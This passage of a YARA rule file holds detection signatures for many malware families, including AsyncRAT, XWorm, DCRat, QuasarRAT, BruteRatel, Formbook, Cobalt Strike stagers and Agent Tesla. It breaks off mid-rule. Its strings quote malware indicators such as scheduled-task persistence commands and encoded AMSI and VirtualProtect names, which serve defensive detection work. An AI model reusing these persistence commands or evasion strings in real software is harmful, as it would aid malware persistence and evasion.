rule R3C0NST_UNC2891_Caketap
{
	meta:
		description = "Detects UNC2891 Rootkit Caketap"
		author = "Frank Boldewin (@r3c0nst)"
		id = "9c2ffe3d-69ca-5f93-bdb1-40e449139dec"
		date = "2022-03-30"
		modified = "2023-01-05"
		reference = "https://github.com/fboldewin/YARA-rules/"
		source_url = "https://github.com/fboldewin/YARA-rules//blob/54e9e6899b258b72074b2b4db6909257683240c2/UNC2891_Caketap.yar#L1-L16"
		license_url = "N/A"
		logic_hash = "530a7d062a218217d2c05460428b2576c3fe2a6099c93940aabde73c513a8914"
		score = 75
		quality = 88
		tags = ""

	strings:
		$str1 = ".caahGss187" ascii fullword
		$str2 = "ipstat" ascii
		$code1 = {41 80 7E 06 4B 75 ?? 41 80 7E 07 57 75 ?? 41 0F B6 46 2B}
		$code2 = {41 C6 46 01 3D 41 C6 46 08 32}

	condition:
		uint32( 0 ) == 0x464c457f and ( all of ( $code* ) or ( all of ( $str* ) and #str2 == 2 ) )
}

rule R3C0NST_Shellcode_Apihashing_FIN8
{
	meta:
		description = "Detects FIN8 Shellcode APIHashing"
		author = "Frank Boldewin (@r3c0nst)"
		id = "a5b4a925-c4cc-5d3a-a2f1-3372f77ceea2"
		date = "2021-03-16"
		modified = "2021-03-25"
		reference = "https://www.bitdefender.com/files/News/CaseStudies/study/394/Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf"
		source_url = "https://github.com/fboldewin/YARA-rules//blob/54e9e6899b258b72074b2b4db6909257683240c2/Shellcode.APIHashing.FIN8.yar#L1-L74"
		license_url = "N/A"
		logic_hash = "958d6a3c0c78ad22fb56896d6a97b9fe79c56813dc36a37385f3ce5621008624"
		score = 75
		quality = 90
		tags = ""

	strings:
		$APIHashing32bit1 = {68 F2 55 03 88 68 65 19 6D 1E}
		$APIHashing32bit2 = {68 9B 59 27 21 C1 E9 17 33 4C 24 10 68 37 5C 32 F4}
		$APIHashing64bit = {49 BF 65 19 6D 1E F2 55 03 88 49 BE 37 5C 32 F4 9B 59 27 21}

	condition:
		all of ( $APIHashing32bit* ) or $APIHashing64bit
}

rule CAPE_Asyncrat_Kingrat
{
	meta:
		description = "No description has been set in the source file - CAPE"
		author = "jeFF0Falltrades"
		id = "45efdcdf-b255-5913-97eb-f296d2c4eb1f"
		date = "2025-02-03"
		modified = "2025-02-03"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/AsyncRAT.yar#L1-L30"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "1400d2029dfb66d8f2dc34db8643d6301f3af9bd356639f883d2c10bcc0c3947"
		score = 75
		quality = 58
		tags = ""
		cape_type = "AsyncRAT Payload"

	strings:
		$str_async = "AsyncClient" wide ascii nocase
		$str_aes_exc = "masterKey can not be null or empty" wide ascii
		$str_schtasks = "schtasks /create /f /sc onlogon /rl highest" wide ascii
		$byte_aes_key_base = { 7E [3] 04 73 [3] 06 80 }
		$byte_aes_salt_base = { BF EB 1E 56 FB CD 97 3B B2 19 }
		$patt_verify_hash = { 7e [3] 04 6f [3] 0a 6f [3] 0a 74 [3] 01 }
		$patt_config = { 72 [3] 70 80 [3] 04 }
		$dcrat_1 = "dcrat" wide ascii nocase
		$dcrat_2 = "qwqdan" wide ascii
		$dcrat_3 = "YW1zaS5kbGw=" wide ascii
		$dcrat_4 = "VmlydHVhbFByb3RlY3Q=" wide ascii
		$dcrat_5 = "save_Plugin" wide ascii
		$ww2 = "WorldWindClient" wide fullword nocase
		$ww3 = "WorldWindStealer" wide fullword nocase
		$ww4 = "*WorldWind Pro - Results:*" wide fullword nocase
		$ww5 = /WorldWind(\s)?Stealer/ ascii wide
		$prynt = /Prynt(\s)?Stealer/ ascii wide

	condition:
		( not any of ( $dcrat* ) and not any of ( $ww* ) and not $prynt ) and 6 of them and #patt_config >= 10
}

rule CAPE_Xworm_Kingrat
{
	meta:
		description = "No description has been set in the source file - CAPE"
		author = "jeFF0Falltrades"
		id = "76332a42-97c9-52fe-83dc-04ceb367f692"
		date = "2025-02-03"
		modified = "2025-02-03"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/AsyncRAT.yar#L138-L155"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "3914be652bb7271e5e6b89d05edf10a54f8ddaf9e22d194b60501aa2cdd495d3"
		score = 75
		quality = 66
		tags = ""
		cape_type = "XWorm payload"

	strings:
		$str_xworm = "xworm" wide ascii nocase
		$str_xwormmm = "Xwormmm" wide ascii
		$str_xclient = "XClient" wide ascii
		$str_default_log = "\\Log.tmp" wide ascii
		$str_create_proc = "/create /f /RL HIGHEST /sc minute /mo 1 /t" wide ascii
		$str_ddos_start = "StartDDos" wide ascii
		$str_ddos_stop = "StopDDos" wide ascii
		$str_timeout = "timeout 3 > NUL" wide ascii
		$byte_md5_hash = { 7e [3] 04 28 [3] 06 6f }
		$patt_config = { 72 [3] 70 80 [3] 04 }

	condition:
		5 of them and #patt_config >= 7
}

rule CAPE_Dcrat_Kingrat
{
	meta:
		description = "No description has been set in the source file - CAPE"
		author = "jeFF0Falltrades"
		id = "9b63e361-6678-5c95-be32-777feecd194b"
		date = "2025-02-03"
		modified = "2025-02-03"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/AsyncRAT.yar#L224-L243"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "73ac27c3f0fc71d053e89690b5a7d29c1f8b0ea0a22e8595148a9001799fae54"
		score = 75
		quality = 62
		tags = ""
		cape_type = "DCRat Payload"

	strings:
		$venom_1 = "VenomRAT" wide ascii nocase
		$venom_2 = "HVNC_REPLY_MESSAGE" wide ascii
		$str_aes_exc = "masterKey can not be null or empty" wide ascii
		$str_b64_amsi = "YW1zaS5kbGw=" wide ascii
		$str_b64_virtual_protect = "VmlydHVhbFByb3RlY3Q=" wide ascii
		$str_dcrat = "dcrat" wide ascii nocase
		$str_plugin = "save_Plugin" wide ascii
		$str_qwqdan = "qwqdan" wide ascii
		$byte_aes_key_base = { 7E [3] 04 73 [3] 06 80 }
		$patt_config = { 72 [3] 70 80 [3] 04 }
		$patt_verify_hash = { 7e [3] 04 6f [3] 0a 6f [3] 0a 74 [3] 01 }

	condition:
		( not any of ( $venom* ) ) and 5 of them and #patt_config >= 10
}

rule CAPE_Quasarrat_Kingrat
{
	meta:
		description = "No description has been set in the source file - CAPE"
		author = "jeFF0Falltrades"
		id = "dc0139e1-9f69-51da-b28f-212358b2f68b"
		date = "2025-02-03"
		modified = "2025-02-03"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/AsyncRAT.yar#L268-L287"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "1f4296a592134edbe52e256dc353143af02e897ff1afad98f3dac0c5ab13f3f7"
		score = 75
		quality = 70
		tags = ""
		cape_type = "QuasarRAT Payload"

	strings:
		$str_quasar = "Quasar." wide ascii
		$str_hidden = "set_Hidden" wide ascii
		$str_shell = "DoShellExecuteResponse" wide ascii
		$str_close = "echo DONT CLOSE THIS WINDOW!" wide ascii
		$str_pause = "ping -n 10 localhost > nul" wide ascii
		$str_aes_exc = "masterKey can not be null or empty" wide ascii
		$byte_aes_key_base = { 7E [3] 04 73 [3] 06 25 }
		$byte_aes_salt_base = { BF EB 1E 56 FB CD 97 3B B2 19 }
		$byte_special_folder = { 7e 73 [4] 28 [4] 80 }
		$patt_config = { 72 [3] 70 80 [3] 04 }
		$patt_verify_hash = { 7e [3] 04 6f [3] 0a 6f [3] 0a 74 [3] 01 }

	condition:
		6 of them and #patt_config >= 10
}

rule CAPE_Bruteratel
{
	meta:
		description = "BruteRatel Payload"
		author = "kevoreilly"
		id = "61b951e4-0c27-59c0-8ea2-715b673fdcee"
		date = "2024-07-11"
		modified = "2024-07-11"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/BruteRatel.yar#L1-L14"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "0984977c716d6f8e068c045166eb5db77c9fbce27513e555dceca348375f1a66"
		score = 75
		quality = 70
		tags = ""
		cape_type = "BruteRatel Payload"

	strings:
		$syscall1 = {49 89 CA 4? 89 ?? (41 FF|FF)}
		$syscall2 = {49 89 CA 48 8B 44 24 ?? FF 64 24}
		$jmpapi = {49 89 ?? 10 49 C7 45 08 ?? 00 00 00 E8 00 00 00 00 ?? (48|49) 83 [2] 41 FF E2}
		$decode = {89 C2 8A 14 17 40 38 EA 75 06 FF C0 89 03 EB 0B 41 88 14 08 48 FF C1 FF 03 EB}

	condition:
		2 of them
}

rule CAPE_Latrodectus
{
	meta:
		description = "Latrodectus Payload"
		author = "enzok"
		id = "956b6736-b3ef-5974-b3dd-02d04336dbe8"
		date = "2025-05-10"
		modified = "2025-05-10"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/Latrodectus.yar#L1-L16"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		hash = "a547cff9991a713535e5c128a0711ca68acf9298cc2220c4ea0685d580f36811"
		logic_hash = "a8430299930f4c8de0a88c6836d4821871f7183cc5ff44ea9be84fbea47bbb13"
		score = 75
		quality = 70
		tags = ""
		cape_type = "Latrodectus Payload"

	strings:
		$fnvhash1 = {C7 04 24 C5 9D 1C 81 48 8B 44 24 20 48 89 44 24 08}
		$fnvhash2 = {8B 0C 24 33 C8 8B C1 89 04 24 69 04 24 93 01 00 01}
		$procchk1 = {E8 [3] FF 85 C0 74 [2] FF FF FF FF E9 [4] E8 [4] 89 44 24 ?? E8 [4] 83 F8 4B 73 ?? 83 [3] 06}
		$procchk2 = {72 [2] FF FF FF FF E9 [4] E8 [4] 83 F8 32 73 ?? 83 [3] 06}
		$version = {C7 44 2? ?? ?? 00 00 00 C7 44 2? ?? ?? 00 00 00 8B 05 [4] 89}

	condition:
		all of them
}

rule CAPE_Latrodectus_AES
{
	meta:
		description = "Latrodectus Payload"
		author = "enzok"
		id = "16c295f5-cea0-57b5-b826-e1126e50c8cc"
		date = "2025-05-10"
		modified = "2025-05-10"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/Latrodectus.yar#L18-L34"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		hash = "5cecb26a3f33c24b92a0c8f6f5175da0664b21d7c4216a41694e4a4cad233ca8"
		logic_hash = "058d278c16527969066d1b4ea7f0e3ab2809d5480cdab06ec476b465e0c4795a"
		score = 75
		quality = 70
		tags = ""
		cape_type = "Latrodectus Payload"

	strings:
		$fnvhash1 = {C7 04 24 C5 9D 1C 81 48 8B 44 24 20 48 89 44 24 08}
		$fnvhash2 = {8B 0C 24 33 C8 8B C1 89 04 24 69 04 24 93 01 00 01}
		$key = {C6 44 2? ?? ?? [150] C6 44 2? ?? ?? B8 02}
		$aes_ctr_1 = {8B 44 24 ?? FF C8 89 44 24 ?? 83 7C 24 ?? 00 7C ?? 4? 63 44 24 ?? 4? 8B 4C 24 ?? 0F B6 84 01 F0 00 00 00 3D FF 00 00 00}
		$aes_ctr_2 = {48 03 C8 48 8B C1 0F B6 ?? 48 63 4C 24 ?? 0F B6 4C 0C ?? 33 C1 48 8B 4C 24 ?? 48 8B 54 24 ?? 48 03 D1 48 8B CA 88 01}
		$version = {C7 44 2? ?? ?? 00 00 00 C7 44 2? ?? ?? 00 00 00 8B 05 [4] 89}

	condition:
		all of them
}

rule CAPE_Rcsession
{
	meta:
		description = "RCSession Payload"
		author = "kevoreilly"
		id = "841e6bd1-4f09-54dc-8dec-2e9423a34003"
		date = "2019-10-30"
		modified = "2019-10-30"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/RCSession.yar#L1-L12"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "ebd1e9e615a91c35b36332cad55519607323469df738cec4464288b45787630d"
		score = 75
		quality = 70
		tags = ""
		cape_type = "RCSession Payload"

	strings:
		$a1 = {56 33 F6 39 74 24 08 7E 4C 53 57 8B F8 2B FA 8B C6 25 03 00 00 80 79 05 48 83 C8 FC 40 83 E8 00 74 19 48 74 0F 48 74 05 6B C9 09 EB 15 8B C1 C1 E8 02 EB 03 8D 04 09 2B C8}
		$a2 = {83 C4 10 85 C0 74 ?? BE ?? ?? ?? ?? 89 74 24 10 E8 ?? ?? ?? ?? 6A 03 68 48 0B 00 00 56 53 57 68 02 00 00 80 E8 ?? ?? ?? ?? 83 C4 18 85 C0 74 18 E8 ?? ?? ?? ?? 6A 03 68 48}

	condition:
		( any of ( $a* ) )
}

rule CAPE_Formbook
{
	meta:
		description = "Formbook Payload"
		author = "kevoreilly"
		id = "3389c0a7-eb86-5465-8a14-63f812d257db"
		date = "2023-10-13"
		modified = "2023-10-13"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/Formbook.yar#L1-L18"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "63ee4dd6fe5ed2a3e5ee88ba7de48d2c9e0024961a550d0fdb68891c9885e05e"
		score = 75
		quality = 70
		tags = ""
		cape_type = "Formbook Payload"
		packed = "9e38c0c3c516583da526016c4c6a671c53333d3d156562717db79eac63587522"
		packed = "2379a4e1ccdd7849ad7ea9e11ee55b2052e58dda4628cd4e28c3378de503de23"

	strings:
		$remap_ntdll = {33 56 0? 8D 86 [2] 00 00 68 F0 00 00 00 50 89 56 ?? E8 [4] 8B [1-5] 6A 00 6A 04 8D 4D ?? 51 6A 07 52 56 E8 [4] 8B 45 ?? 83 C4 20 3B}
		$rc4dec = {F7 E9 C1 FA 03 8B C2 C1 E8 1F 03 C2 8D 04 80 03 C0 03 C0 8B D1 2B D0 8A 04 3A 88 8C 0D [4] 88 84 0D [4] 41 81 F9 00 01 00 00 7C}
		$decrypt = {8A 50 01 28 10 48 49 75 F7 83 FE 01 76 14 8B C7 8D 4E FF 8D 9B 00 00 00 00 8A 50 01 28 10 40 49 75 F7}
		$string = {33 C0 66 39 01 74 0B 8D 49 00 40 66 83 3C 41 00 75 F8 8B 55 0C 8D 44 00 02 50 52 51 E8}
		$mutant = {64 A1 18 00 00 00 8B 40 ?? 89 45 ?? 8B 45 ?? 8B 40 ?? 8B E5 5D C3}
		$postmsg = {8B 7D 0C 6A 00 6A 00 68 11 01 00 00 57 FF D6 85 C0 75 ?? 50}

	condition:
		2 of them
}

rule CAPE_Rhadamanthys
{
	meta:
		description = "Rhadamanthys Loader"
		author = "kevoreilly"
		id = "4683ef43-7397-5546-ae54-b4c000518182"
		date = "2023-09-18"
		modified = "2023-09-18"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/Rhadamanthys.yar#L1-L14"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "f71bee3ef1dd7b16a55397645d16c0a20d1fdd3bf662f241c0b11796629b11ff"
		score = 75
		quality = 70
		tags = ""
		cape_type = "Rhadamanthys Loader"

	strings:
		$rc4 = {88 4C 01 08 41 81 F9 00 01 00 00 7C F3 89 75 08 33 FF 8B 4D 08 3B 4D 10 72 04 83 65 08 00}
		$code = {8B 4D FC 3B CF 8B C1 74 0D 83 78 04 02 74 1C 8B 40 1C 3B C7 75 F3 3B CF 8B C1 74 57 83 78 04 17 74 09 8B 40 1C 3B C7 75 F3 EB}
		$conf = {46 BB FF 00 00 00 23 F3 0F B6 44 31 08 03 F8 23 FB 0F B6 5C 39 08 88 5C 31 08 88 44 39 08 02 C3 8B 5D 08 0F B6 C0 8A 44 08 08}
		$cape_string = "cape_options"

	condition:
		2 of them and not $cape_string
}

rule CAPE_Adaptixbeacon
{
	meta:
		description = "AdaptixBeacon Payload"
		author = "enzok"
		id = "f315f0ed-97a4-5783-a01a-ec643098f423"
		date = "2025-06-16"
		modified = "2025-06-16"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/AdaptixBeacon.yar#L1-L16"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		hash = "f78f5803be5704420cbb2e0ac3c57fcb3d9cdf443fbf1233c069760bee115b5d"
		logic_hash = "a05b5fed6328229f8490731ef9884f5b8225f8628b81dc199ea5c11fa25b8d0c"
		score = 75
		quality = 70
		tags = ""
		cape_type = "AdaptixBeacon Payload"

	strings:
		$conf_1 = {8D ?? ?? E8 [3] 00 4? 89 [1-2] 4? 8B 4C 24 ?? E8 [3] 00 4? 8B 53 48 66 [0-1] 89 04}
		$conf_2 = {E8 [3] 00 48 8B 4C 24 ?? 48 89 43 78 E8 [3] 00 48 8B 4C 24 ?? 89 83 80 00 00 00 E8 [3] 00 03 83 80 00 00 00 48 8B 4C 24}
		$conf_3 = {E8 [3] 00 4? 8B 4C 24 ?? 4? 89 ?? 4? 89 43 58 E8 [3] 00 4? 8B 4C 24 ?? 4? 89 ?? 4? 89 43 60 E8 [3] 00 4? 8B 4C 24 ?? 4? 89 ?? 4? 89 43 68}
		$wininet_1 = {B9 77 00 00 00 4? 89 50 28 E8 [4] B9 69 00 00 00 88 44 24 ?? E8 [4] B9 6E 00 00 00 88 44 24}
		$wininet_2 = {B9 69 00 00 00 88 44 24 ?? E8 [4] B9 6E 00 00 00 88 44 24 ?? E8 [4] B9 65 00 00 00 88 44 24}

	condition:
		1 of ( $conf_* ) and 1 of ( $wininet_* )
}

rule CAPE_Xenorat
{
	meta:
		description = "No description has been set in the source file - CAPE"
		author = "jeFF0Falltrades"
		id = "9708158d-06fc-5991-a084-df2bfe1d5c96"
		date = "2024-10-09"
		modified = "2024-10-09"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/XenoRAT.yar#L1-L14"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "26f520fb69a52d05786fac0e9e38f5db9601da0a3e7768e00975a9684f3560ef"
		score = 75
		quality = 66
		tags = ""
		cape_type = "XenoRAT payload"

	strings:
		$str_xeno_rat_1 = "xeno rat" wide ascii nocase
		$str_xeno_rat_2 = "xeno_rat" wide ascii nocase
		$str_xeno_update_mgr = "XenoUpdateManager" wide ascii
		$str_nothingset = "nothingset" wide ascii
		$byte_enc_dec_pre = { 1f 10 8d [4] (0a | 0b) }
		$patt_config = { 72 [3] 70 80 [3] 04 }

	condition:
		4 of them and #patt_config >= 5
}

rule CAPE_Darkgate
{
	meta:
		description = "DarkGate Payload"
		author = "enzok"
		id = "ce81f452-4096-51d6-97cc-624f9fbefa86"
		date = "2024-02-26"
		modified = "2024-02-26"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/DarkGate.yar#L1-L16"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "25c0e77a83676c6a18445f8df0b1f7a9148de5f64eeb532f9a4f4d4652dd8191"
		score = 75
		quality = 70
		tags = ""
		cape_type = "DarkGate Payload"

	strings:
		$part1 = {8B 55 ?? 8A 4D ?? 80 E1 3F C1 E1 02 8A 5D ?? 80 E3 30 81 E3 FF [3] C1 EB 04 02 CB 88 4C 10 FF FF 45 ?? 80 7D ?? 40}
		$part2 = {8B 55 ?? 8A 4D ?? 80 E1 0F C1 E1 04 8A 5D ?? 80 E3 3C 81 E3 FF [3] C1 EB 02 02 CB 88 4C 10 FF FF 45 ?? 80 7D ?? 40}
		$part3 = {8B 55 ?? 8A 4D ?? 80 E1 03 C1 E1 06 8A 5D ?? 80 E3 3F 02 CB 88 4C 10 FF FF 45}
		$alphabet = "zLAxuU0kQKf3sWE7ePRO2imyg9GSpVoYC6rhlX48ZHnvjJDBNFtMd1I5acwbqT+="
		$config1 = {B9 01 04 00 00 E8 [4] 8D 45}
		$config2 = {8B 55 ?? 8D 45 ?? E8 [4] 8D 45 ?? 5? B? 06 00 00 00 B? 01 00 00 00 8B 45 ?? E8 [4] 8B 45 ?? B? [4] E8 [4] 75}

	condition:
		($alphabet ) and ( any of ( $part* ) or all of ( $config* ) )
}

rule CAPE_Cobaltstrikestager
{
	meta:
		description = "Cobalt Strike Stager Payload"
		author = "@dan__mayer <daniel@stairwell.com>"
		id = "eedf71b1-9f27-5a6f-afe8-3ddae47f9a06"
		date = "2023-01-18"
		modified = "2023-01-18"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/CobaltStrikeStager.yar#L1-L15"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "6a55b0c3ab5f557dfb7a3f8bd616ede1bd9b93198590fc9d52aa19c1154388c5"
		score = 75
		quality = 70
		tags = ""
		cape_type = "CobaltStrikeStager Payload"

	strings:
		$smb = { 68 00 B0 04 00 68 00 B0 04 00 6A 01 6A 06 6A 03 52 68 45 70 DF D4 }
		$http_x86 = { 68 6E 65 74 00 68 77 69 6E 69 54 68 4C 77 26 07 }
		$http_x64 = { 49 BE 77 69 6E 69 6E 65 74 00 41 56 49 89 E6 4C 89 F1 41 BA 4C 77 26 07 }
		$dns = { 68 00 10 00 00 68 FF FF 07 00 6A 00 68 58 A4 53 E5 }

	condition:
		any of them
}

rule CAPE_Rozena
{
	meta:
		description = "No description has been set in the source file - CAPE"
		author = "Kevin O'Reilly"
		id = "38ca9da3-2a0e-500f-8eb8-9de69a7f2da5"
		date = "2024-03-15"
		modified = "2024-03-15"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/Rozena.yar#L1-L10"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "c415a8108b58a125a604031bb8d73b58a8aae5429b5b765e35fa8a4add9cd135"
		score = 75
		quality = 70
		tags = ""
		cape_type = "Rozena Payload"

	strings:
		$ip_port = {FF D5 6A 0A 68 [4] 68 [4] 89 E6 50 50 50 50 40 50 40 50 68 [4] FF D5}
		$socket = {6A 00 6A 04 56 57 68 [4] FF D5 [0-5] 8B 36 6A 40 68 00 10 00 00 56 6A 00 68}

	condition:
		all of them
}

rule CAPE_Smokeloader
{
	meta:
		description = "SmokeLoader Payload"
		author = "kevoreilly"
		id = "d3ca7c8a-01dc-5174-9928-ee278b6cb107"
		date = "2024-11-12"
		modified = "2024-11-12"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/SmokeLoader.yar#L1-L14"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "779e2ac213e5ced7bc06e6208826b65cf8fc3113a69ede6408b84055542fa76d"
		score = 75
		quality = 70
		tags = ""
		cape_type = "SmokeLoader Payload"

	strings:
		$rc4_decrypt64 = {41 8D 41 01 44 0F B6 C8 42 0F B6 [2] 41 8D 04 12 44 0F B6 D0 42 8A [2] 42 88 [2] 42 88 [2] 42 0F B6 [2] 03 CA 0F B6 C1 8A [2] 30 0F 48 FF C7 49 FF CB 75}
		$rc4_decrypt32 = {47 B9 FF 00 00 00 23 F9 8A 54 [2] 0F B6 C2 03 F0 23 F1 8A 44 [2] 88 44 [2] 88 54 [2] 0F B6 4C [2] 0F B6 C2 03 C8 81 E1 FF 00 00 00 8A 44 [2] 30 04 2B 43 3B 9C 24 [4] 72 C0}
		$fetch_c2_64 = {74 ?? B? E8 03 00 00 B9 58 02 00 00 FF [5] 48 FF C? 75 F0 [6-10] 48 8D 05}
		$fetch_c2_32 = {8B 96 [2] (00|01) 00 8B CE 5E 8B 14 95 [4] E9}

	condition:
		2 of them
}

rule CAPE_Oyster
{
	meta:
		description = "Oyster Payload"
		author = "enzok"
		id = "29443d00-e3de-53fd-b617-df470a30e805"
		date = "2024-05-30"
		modified = "2024-05-30"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/Oyster.yar#L1-L19"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		hash = "8bae0fa9f589cd434a689eebd7a1fde949cc09e6a65e1b56bb620998246a1650"
		logic_hash = "23ab1518712dbce8319b87785d7ffc0c2b61de82c2bbf533ebf0aae39ec33540"
		score = 75
		quality = 70
		tags = ""
		cape_type = "Oyster Payload"

	strings:
		$start_exit = {(05 | 00) 00 00 00 2E 96 1E A6}
		$content_type = {F6 CE 56 F4 76 F6 96 2E 86 C6 96 36 0E 0E 86 04 5C A6 0E 9E 2A B4 2E 76 A6 2E 76 F6 C2}
		$domain = {44 5C 44 76 96 86 B6 F6 26 44 34 44}
		$id = {44 5C 44 64 96 44 DE}
		$ip_local = {44 5C 44 36 86 C6 F6 36 FA 0E 96 44 34 44}
		$table_part_1 = {00 80 40 C0 20 A0 60 E0 10 90 50 D0 30 B0 70 F0 08 88 48 C8 28 A8 68}
		$table_part_2 = {97 57 D7 37 B7 77 F7 0F 8F 4F CF 2F AF 6F EF 1F 9F 5F DF 3F BF 7F FF}
		$decode = {0F B6 0? 8D ?? FF 8A [2] 0F B6 80 [4] 88 04 ?? 46 0F B6 C? 0F B6 80 [4] 88 4? 01 3B F7}

	condition:
		4 of them
}

rule CAPE_Agent_Tesla
{
	meta:
		description = "Detecting HTML strings used by Agent Tesla malware"
		author = "Stormshield"
		id = "5383994b-357d-539b-89b1-53be238f759d"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/AgentTesla.yar#L1-L17"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "3945754129dcc58e0abfd7485f5ff0c0afdd1078ae2cf164ca8f59a6f79db1be"
		score = 75
		quality = 70
		tags = ""
		version = "1.0"

	strings:
		$html_username = "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_pc_name = "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_os_name = "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " wide ascii
		$html_os_platform = "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_clipboard = "<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>" wide ascii

	condition:
		3 of them
}

rule CAPE_Agentteslav4Jit
{
	meta:
		description = "AgentTesla JIT-compiled native code"
		author = "kevoreilly"
		id = "a87dca44-4974-543c-9565-487ed99be2a6"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/AgentTesla.yar#L128-L141"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
